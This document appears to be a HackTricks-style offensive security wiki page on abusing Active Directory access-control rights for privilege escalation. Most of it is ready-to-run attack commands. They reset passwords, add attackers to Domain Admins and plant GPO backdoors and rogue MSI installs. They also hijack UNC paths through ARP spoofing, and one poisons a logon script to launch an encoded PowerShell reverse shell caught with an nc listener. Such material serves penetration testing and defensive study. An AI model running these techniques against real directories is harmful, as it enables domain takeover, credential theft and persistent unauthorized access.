_body: "# Abusing Active Directory ACLs/ACEs\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n**This page is mostly\
  \ a summary of the techniques from** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)\
  \ **and** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**.\
  \ For more details, check the original articles.**\n\n## BadSuccessor\n\n\n{{#ref}}\nBadSuccessor.md\n{{#endref}}\n\n##\
  \ **GenericAll Rights on User**\n\nThis privilege grants an attacker full control over a target user account. Once `GenericAll`\
  \ rights are confirmed using the `Get-ObjectAcl` command, an attacker can:\n\n- **Change the Target's Password**: Using\
  \ `net user <username> <password> /domain`, the attacker can reset the user's password.\n- From Linux, you can do the same\
  \ over SAMR with Samba `net rpc`:\n\n```bash\n# Reset target user's password over SAMR from Linux\nnet rpc password <samAccountName>\
  \ '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>\n```\n\n- **If the account is disabled, clear the UAC flag**: `GenericAll`\
  \ allows editing `userAccountControl`. From Linux, BloodyAD can remove the `ACCOUNTDISABLE` flag:\n\n```bash\nbloodyAD --host\
  \ <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE\n```\n\n- **Targeted Kerberoasting**:\
  \ Assign an SPN to the user's account to make it kerberoastable, then use Rubeus and targetedKerberoast.py to extract and\
  \ attempt to crack the ticket-granting ticket (TGT) hashes.\n\n```bash\nSet-DomainObject -Credential $creds -Identity <username>\
  \ -Set @{serviceprincipalname=\"fake/NOTHING\"}\n.\\Rubeus.exe kerberoast /user:<username> /nowrap\nSet-DomainObject -Credential\
  \ $creds -Identity <username> -Clear serviceprincipalname -Verbose\n```\n\n- **Targeted ASREPRoasting**: Disable pre-authentication\
  \ for the user, making their account vulnerable to ASREPRoasting.\n\n```bash\nSet-DomainObject -Identity <username> -XOR\
  \ @{UserAccountControl=4194304}\n```\n\n- **Shadow Credentials / Key Credential Link**: With `GenericAll` on a user you\
  \ can add a certificate-based credential and authenticate as them without changing their password. See:\n\n{{#ref}}\nshadow-credentials.md\n\
  {{#endref}}\n\n## **GenericAll Rights on Group**\n\nThis privilege allows an attacker to manipulate group memberships if\
  \ they have `GenericAll` rights on a group like `Domain Admins`. After identifying the group's distinguished name with `Get-NetGroup`,\
  \ the attacker can:\n\n- **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules\
  \ like Active Directory or PowerSploit.\n\n```bash\nnet group \"domain admins\" spotless /add /domain\nAdd-ADGroupMember\
  \ -Identity \"domain admins\" -Members spotless\nAdd-NetGroupUser -UserName spotless -GroupName \"domain admins\" -Domain\
  \ \"offense.local\"\n```\n\n- From Linux you can also leverage BloodyAD to add yourself into arbitrary groups when you hold\
  \ GenericAll/Write membership over them. If the target group is nested into “Remote Management Users”, you will immediately\
  \ gain WinRM access on hosts honoring that group:\n\n```bash\n# Linux tooling example (BloodyAD) to add yourself to a target\
  \ group\nbloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember \"<Target Group>\" <user>\n\n# If the\
  \ target group is member of \"Remote Management Users\", WinRM becomes available\nnetexec winrm <dc-fqdn> -u <user> -p '<pass>'\n\
  ```\n\n## **GenericAll / GenericWrite / Write on Computer/User**\n\nHolding these privileges on a computer object or a user\
  \ account allows for:\n\n- **Kerberos Resource-based Constrained Delegation**: Enables taking over a computer object.\n\
  - **Shadow Credentials**: Use this technique to impersonate a computer or user account by exploiting the privileges to create\
  \ shadow credentials.\n\n## **WriteProperty on Group**\n\nIf a user has `WriteProperty` rights on all objects for a specific\
  \ group (e.g., `Domain Admins`), they can:\n\n- **Add Themselves to the Domain Admins Group**: Achievable via combining\
  \ `net user` and `Add-NetGroupUser` commands, this method allows privilege escalation within the domain.\n\n```bash\nnet\
  \ user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName \"domain admins\" -Domain \"offense.local\"; net\
  \ user spotless /domain\n```\n\n## **Self (Self-Membership) on Group**\n\nThis privilege enables attackers to add themselves\
  \ to specific groups, such as `Domain Admins`, through commands that manipulate group membership directly. Using the following\
  \ command sequence allows for self-addition:\n\n```bash\nnet user spotless /domain; Add-NetGroupUser -UserName spotless\
  \ -GroupName \"domain admins\" -Domain \"offense.local\"; net user spotless /domain\n```\n\n## **WriteProperty (Self-Membership)**\n\
  \nA similar privilege, this allows attackers to directly add themselves to groups by modifying group properties if they\
  \ have the `WriteProperty` right on those groups. The confirmation and execution of this privilege are performed with:\n\
  \n```bash\nGet-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\" -and $_.IdentityReference\
  \ -eq \"OFFENSE\\spotless\"}\nnet group \"domain admins\" spotless /add /domain\n```\n\n## **ForceChangePassword**\n\nHolding\
  \ the `ExtendedRight` on a user for `User-Force-Change-Password` allows password resets without knowing the current password.\
  \ Verification of this right and its exploitation can be done through PowerShell or alternative command-line tools, offering\
  \ several methods to reset a user's password, including interactive sessions and one-liners for non-interactive environments.\
  \ The commands range from simple PowerShell invocations to using `rpcclient` on Linux, demonstrating the versatility of\
  \ attack vectors.\n\n```bash\nGet-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq \"OFFENSE\\\
  spotless\"}\nSet-DomainUserPassword -Identity delegate -Verbose\nSet-DomainUserPassword -Identity delegate -AccountPassword\
  \ (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose\n```\n\n```bash\nrpcclient -U KnownUsername 10.10.10.192\n\
  > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'\n```\n\n## **WriteOwner on Group**\n\nIf an attacker finds that they\
  \ have `WriteOwner` rights over a group, they can change the ownership of the group to themselves. This is particularly\
  \ impactful when the group in question is `Domain Admins`, as changing ownership allows for broader control over group attributes\
  \ and membership. The process involves identifying the correct object via `Get-ObjectAcl` and then using `Set-DomainObjectOwner`\
  \ to modify the owner, either by SID or name.\n\n```bash\nGet-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\"\
  \ -and $_.IdentityReference -eq \"OFFENSE\\spotless\"}\nSet-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512\
  \ -OwnerIdentity \"spotless\" -Verbose\nSet-DomainObjectOwner -Identity Herman -OwnerIdentity nico\n```\n\n## **GenericWrite\
  \ on User**\n\nThis permission allows an attacker to modify user properties. Specifically, with `GenericWrite` access, the\
  \ attacker can change the logon script path of a user to execute a malicious script upon user logon. This is achieved by\
  \ using the `Set-ADObject` command to update the `scriptpath` property of the target user to point to the attacker's script.\n\
  \n```bash\nSet-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue \"\\\\10.0.0.5\\totallyLegitScript.ps1\"\
  \n```\n\n## **GenericWrite on Group**\n\nWith this privilege, attackers can manipulate group membership, such as adding\
  \ themselves or other users to specific groups. This process involves creating a credential object, using it to add or remove\
  \ users from a group, and verifying the membership changes with PowerShell commands.\n\n```bash\n$pwd = ConvertTo-SecureString\
  \ 'JustAWeirdPwd!$' -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\\username',\
  \ $pwd)\nAdd-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose\nGet-DomainGroupMember\
  \ -Identity \"Group Name\" | Select MemberName\nRemove-DomainGroupMember -Credential $creds -Identity \"Group Name\" -Members\
  \ 'username' -Verbose\n```\n\n- From Linux, Samba `net` can add/remove members when you hold `GenericWrite` on the group\
  \ (useful when PowerShell/RSAT are unavailable):\n\n```bash\n# Add yourself to the target group via SAMR\nnet rpc group\
  \ addmem \"<Group Name>\" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>\n# Verify current members\nnet rpc group members\
  \ \"<Group Name>\" -U <domain>/<user>%'<pass>' -S <dc_fqdn>\n```\n\n## **WriteDACL + WriteOwner**\n\nOwning an AD object\
  \ and having `WriteDACL` privileges on it enables an attacker to grant themselves `GenericAll` privileges over the object.\
  \ This is accomplished through ADSI manipulation, allowing for full control over the object and the ability to modify its\
  \ group memberships. Despite this, limitations exist when trying to exploit these privileges using the Active Directory\
  \ module's `Set-Acl` / `Get-Acl` cmdlets.\n\n```bash\n$ADSI = [ADSI]\"LDAP://CN=test,CN=Users,DC=offense,DC=local\"\n$IdentityReference\
  \ = (New-Object System.Security.Principal.NTAccount(\"spotless\")).Translate([System.Security.Principal.SecurityIdentifier])\n\
  $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,\"GenericAll\",\"Allow\"\n$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)\n\
  $ADSI.psbase.commitchanges()\n```\n\n### WriteDACL/WriteOwner quick takeover (PowerView)\n\nWhen you have `WriteOwner` and\
  \ `WriteDacl` over a user or service account, you can take full control and reset its password using PowerView without knowing\
  \ the old password:\n\n```powershell\n# Load PowerView\n. .\\PowerView.ps1\n\n# Grant yourself full control over the target\
  \ object (adds GenericAll in the DACL)\nAdd-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity\
  \ <YouOrYourGroup> -Verbose\n\n# Set a new password for the target principal\n$cred = ConvertTo-SecureString 'P@ssw0rd!2025#'\
  \ -AsPlainText -Force\nSet-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose\n```\n\nNotes:\n- You\
  \ may need to first change the owner to yourself if you only have `WriteOwner`:\n\n```powershell\nSet-DomainObjectOwner\
  \ -Identity <TargetUser> -OwnerIdentity <You>\n```\n\n- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password\
  \ reset.\n\n## **Replication on the Domain (DCSync)**\n\nThe DCSync attack leverages specific replication permissions on\
  \ the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires\
  \ permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment\
  \ without direct access to a Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)\n\n## GPO Delegation\
  \ <a href=\"#gpo-delegation\" id=\"gpo-delegation\"></a>\n\n### GPO Delegation\n\nDelegated access to manage Group Policy\
  \ Objects (GPOs) can present significant security risks. For instance, if a user such as `offense\\spotless` is delegated\
  \ GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions\
  \ can be abused for malicious purposes, as identified using PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference\
  \ -eq \"OFFENSE\\spotless\"}`\n\n### Enumerate GPO Permissions\n\nTo identify misconfigured GPOs, PowerSploit's cmdlets\
  \ can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage: `powershell\
  \ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq \"OFFENSE\\spotless\"}`\n\n**Computers\
  \ with a Given Policy Applied**: It's possible to resolve which computers a specific GPO applies to, helping understand\
  \ the scope of potential impact. `powershell Get-NetOU -GUID \"{DDC640FF-634A-4442-BC2E-C05EED132F0C}\" | % {Get-NetComputer\
  \ -ADSpath $_}`\n\n**Policies Applied to a Given Computer**: To see what policies are applied to a particular computer,\
  \ commands like `Get-DomainGPO` can be utilized.\n\n**OUs with a Given Policy Applied**: Identifying organizational units\
  \ (OUs) affected by a given policy can be done using `Get-DomainOU`.\n\nYou can also use the tool [**GPOHound**](https://github.com/cogiceo/GPOHound)\
  \ to enumerate GPOs and find issues in them.\n\n### Abuse GPO - New-GPOImmediateTask\n\nMisconfigured GPOs can be exploited\
  \ to execute code, for example, by creating an immediate scheduled task. This can be done to add a user to the local administrators\
  \ group on affected machines, significantly elevating privileges:\n\n```bash\nNew-GPOImmediateTask -TaskName evilTask -Command\
  \ cmd -CommandArguments \"/c net localgroup administrators spotless /add\" -GPODisplayName \"Misconfigured Policy\" -Verbose\
  \ -Force\n```\n\n### GroupPolicy module - Abuse GPO\n\nThe GroupPolicy module, if installed, allows for the creation and\
  \ linking of new GPOs, and setting preferences such as registry values to execute backdoors on affected computers. This\
  \ method requires the GPO to be updated and a user to log in to the computer for execution:\n\n```bash\nNew-GPO -Name \"\
  Evil GPO\" | New-GPLink -Target \"OU=Workstations,DC=dev,DC=domain,DC=io\"\nSet-GPPrefRegistryValue -Name \"Evil GPO\" -Context\
  \ Computer -Action Create -Key \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -ValueName \"Updater\" -Value\
  \ \"%COMSPEC% /b /c start /b /min \\\\dc-2\\software\\pivot.exe\" -Type ExpandString\n```\n\n### SharpGPOAbuse - Abuse GPO\n\
  \nSharpGPOAbuse offers a method to abuse existing GPOs by adding tasks or modifying settings without the need to create\
  \ new GPOs. This tool requires modification of existing GPOs or using RSAT tools to create new ones before applying changes:\n\
  \n```bash\n.\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Install Updates\" --Author NT AUTHORITY\\SYSTEM --Command\
  \ \"cmd.exe\" --Arguments \"/c \\\\dc-2\\software\\pivot.exe\" --GPOName \"PowerShell Logging\"\n```\n\n### Force Policy\
  \ Update\n\nGPO updates typically occur around every 90 minutes. To expedite this process, especially after implementing\
  \ a change, the `gpupdate /force` command can be used on the target computer to force an immediate policy update. This command\
  \ ensures that any modifications to GPOs are applied without waiting for the next automatic update cycle.\n\n### Under the\
  \ Hood\n\nUpon inspection of the Scheduled Tasks for a given GPO, like the `Misconfigured Policy`, the addition of tasks\
  \ such as `evilTask` can be confirmed. These tasks are created through scripts or command-line tools aiming to modify system\
  \ behavior or escalate privileges.\n\nThe structure of the task, as shown in the XML configuration file generated by `New-GPOImmediateTask`,\
  \ outlines the specifics of the scheduled task - including the command to be executed and its triggers. This file represents\
  \ how scheduled tasks are defined and managed within GPOs, providing a method for executing arbitrary commands or scripts\
  \ as part of policy enforcement.\n\n### Users and Groups\n\nGPOs also allow for the manipulation of user and group memberships\
  \ on target systems. By editing the Users and Groups policy files directly, attackers can add users to privileged groups,\
  \ such as the local `administrators` group. This is possible through the delegation of GPO management permissions, which\
  \ permits the modification of policy files to include new users or change group memberships.\n\nThe XML configuration file\
  \ for Users and Groups outlines how these changes are implemented. By adding entries to this file, specific users can be\
  \ granted elevated privileges across affected systems. This method offers a direct approach to privilege escalation through\
  \ GPO manipulation.\n\nFurthermore, additional methods for executing code or maintaining persistence, such as leveraging\
  \ logon/logoff scripts, modifying registry keys for autoruns, installing software via .msi files, or editing service configurations,\
  \ can also be considered. These techniques provide various avenues for maintaining access and controlling target systems\
  \ through the abuse of GPOs.\n\n### WriteGPLink + UNC path hijacking (ARP spoofing)\n\n`WriteGPLink` over an OU/domain lets\
  \ you modify the target container's `gPLink` attribute and **force an existing GPO to apply** without editing the GPO itself.\
  \ This becomes interesting when the linked GPO already references remote content over **UNC paths** (`\\\\HOST\\share\\\
  ...`), because authenticated users can read **SYSVOL** and hunt for reusable policies offline.\n\nHigh-level workflow:\n\
  \n1. Use BloodHound to identify a principal with `WriteGPLink` over an OU and enumerate computers/users inside that OU.\n\
  2. Clone `SYSVOL` read-only and parse GPOs looking for **Software Installation**, **drive mappings** (`Drives.xml`), and\
  \ **logon/startup scripts** that reference UNC paths.\n3. Prefer policies pointing to a **direct hostname** (for example\
  \ `\\\\DC02\\share\\pkg.msi`) instead of DFS/domain-namespace paths, because hostname-based paths are easier to redirect\
  \ with L2 spoofing.\n4. Append the chosen GPO GUID to the target OU's `gPLink` so the victim processes that already-existing\
  \ policy.\n5. On the same broadcast domain, ARP spoof the UNC host and bind its IP locally (`ip addr add <target_ip>/32\
  \ dev <iface>`) so the victim's SMB traffic reaches your host.\n6. Serve the expected path/filename from an attacker SMB\
  \ server (for example `smbserver.py`) and wait for normal policy processing.\n\nExample `SYSVOL` collection and GPO correlation:\n\
  \n```bash\nmkdir -p /mnt/$DOMAIN/SYSVOL/\nmount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro \"//$DC_IP/SYSVOL\"\
  \ \"/mnt/$DOMAIN/SYSVOL/\"\nrsync -av --exclude=\"PolicyDefinitions\" --update /mnt/$DOMAIN/SYSVOL .\npython3 parse_sysvol.py\
  \ software -s <SYSVOL> -b <BloodHound_Folder>\npython3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>\npython3\
  \ parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>\n```\n\nLink the existing GPO to the target OU:\n\n```bash\n\
  python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \\\n  --gpo-guid '{<gpo-guid>}' --target-ou \"OU=<TargetOU>,DC=<domain>,DC=<tld>\"\
  \n```\n\n#### Software Installation UNC hijack -> SYSTEM\n\nIf the linked GPO deploys an MSI from a UNC path, the client\
  \ will fetch it during **computer startup** and install it as **`NT AUTHORITY\\SYSTEM`**. By spoofing the referenced host\
  \ and serving a malicious MSI under the **same share/path/name**, you can turn `WriteGPLink` into SYSTEM code execution\
  \ **without modifying SYSVOL**.\n\nImportant constraints:\n\n- **Timing matters**: the new link is seen at policy refresh\
  \ (commonly ~90 minutes), but **Software Installation** usually triggers on **reboot**.\n- Windows Installer commonly tracks\
  \ the deployment using the package **`ProductCode`**. If the product is already installed, deployment may be skipped.\n\
  - To avoid installer rejection, patch the rogue MSI so its **`ProductCode`** and **`PackageCode`** match the legitimate\
  \ package expected by the GPO.\n- Old `.aas` advertisement files may remain in `SYSVOL`, so validate that the deployment\
  \ still looks active before relying on it.\n\n```bash\nip addr add <unc_host_ip>/32 dev <iface>\narpspoof-ng -i <iface>\
  \ -t <victim1>,<victim2> -s <unc_host_ip>\nsmbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip>\
  \ -debug -ts\n```\n\n#### Drive-map UNC hijack -> NTLM capture / WebDAV relay\n\nGPP drive mappings in `Drives.xml` cause\
  \ users to authenticate to the configured UNC path during logon or reconnection. If you spoof the referenced host, you can\
  \ capture **NetNTLMv2**. If SMB is deliberately made to fail, Windows may retry over **WebDAV**, sending **NTLM over HTTP**,\
  \ which is far more flexible for relays to **LDAP(S)**, **AD CS**, or **SMB**.\n\n#### Logon/startup script UNC hijack\n\
  \nThe same pattern applies to UNC-hosted scripts discovered in `SYSVOL`:\n\n- **Logon scripts** usually execute in the **user**\
  \ context.\n- **Startup scripts** usually execute in the **computer / SYSTEM** context.\n\nIf the script path points to\
  \ a spoofable hostname, redirect the UNC host and serve replacement script content from the expected location.\n\n## SYSVOL/NETLOGON\
  \ Logon Script Poisoning\n\nWritable paths under `\\\\<dc>\\SYSVOL\\<domain>\\scripts\\` or `\\\\<dc>\\NETLOGON\\` allow\
  \ tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging\
  \ users.\n\n### Locate logon scripts\n- Inspect user attributes for a configured logon script:\n\n```powershell\nGet-DomainUser\
  \ -Identity <user> -Properties scriptPath, scriptpath\n```\n\n- Crawl domain shares to surface shortcuts or references to\
  \ scripts:\n\n```bash\n# NetExec spider (authenticated)\nnetexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus\n```\n\
  \n- Parse `.lnk` files to resolve targets pointing into SYSVOL/NETLOGON (useful DFIR trick and for attackers without direct\
  \ GPO access):\n\n```bash\n# LnkParse3\nlnkparse login.vbs.lnk\n# Example target revealed:\n# C:\\Windows\\SYSVOL\\sysvol\\\
  <domain>\\scripts\\login.vbs\n```\n\n- BloodHound displays the `logonScript` (scriptPath) attribute on user nodes when present.\n\
  \n### Validate write access (don’t trust share listings)\nAutomated tooling may show SYSVOL/NETLOGON as read-only, but underlying\
  \ NTFS ACLs can still allow writes. Always test:\n\n```bash\n# Interactive write test\nsmbclient \\\\<dc>\\SYSVOL -U <user>%<pass>\n\
  smb: \\\\> cd <domain>\\scripts\\\nsmb: \\\\<domain>\\scripts\\\\> put smallfile.txt login.vbs   # check size/time change\n\
  ```\n\nIf file size or mtime changes, you have write. Preserve originals before modifying.\n\n### Poison a VBScript logon\
  \ script for RCE\nAppend a command that launches a PowerShell reverse shell (generate from revshells.com) and keep original\
  \ logic to avoid breaking business function:\n\n```vb\n' At top of login.vbs\nSet cmdshell = CreateObject(\"Wscript.Shell\"\
  )\ncmdshell.run \"powershell -e <BASE64_PAYLOAD>\"\n\n' Existing mappings remain\nMapNetworkShare \"\\\\\\\\<dc_fqdn>\\\\\
  apps\", \"V\"\nMapNetworkShare \"\\\\\\\\<dc_fqdn>\\\\docs\", \"L\"\n```\n\nListen on your host and wait for the next interactive\
  \ logon:\n\n```bash\nrlwrap -cAr nc -lnvp 443\n```\n\nNotes:\n- Execution happens under the logging user’s token (not SYSTEM).\
  \ Scope is the GPO link (OU, site, domain) applying that script.\n- Clean up by restoring the original content/timestamps\
  \ after use.\n\n\n## References\n\n- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)\n\
